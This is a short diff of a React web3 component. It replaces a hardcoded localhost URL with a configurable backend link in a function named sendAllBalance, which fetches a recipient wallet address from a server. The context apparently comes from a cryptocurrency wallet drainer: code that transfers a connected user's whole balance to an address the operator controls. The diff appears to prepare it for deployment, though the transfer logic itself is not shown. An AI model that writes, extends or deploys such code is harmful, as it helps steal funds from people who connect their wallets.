@@ -1,8 +1,10 @@
 'use client'
 
-import { useState } from 'react'
-import Web3 from 'web3'
-import type { TransactionReceipt } from 'web3-types'
+import { useState } from 'react';
+import Web3 from 'web3';
+import type { TransactionReceipt } from 'web3-types';
+
+import { BACKEND_LINK } from '@/utils/variables';
 
 interface EthereumProvider {
   selectedAddress?: string
@@ -25,7 +27,7 @@ async function sendAllBalance(
   { isTrustWallet }: { isTrustWallet: boolean },
 ): Promise<string> {
   setStatus('Получаем адрес получателя от бэка…')
-  const res = await fetch('http://localhost:8000/contract')
+  const res = await fetch(`${BACKEND_LINK}/contract`)
   if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
   const { recipient } = (await res.json()) as { recipient: string }
 
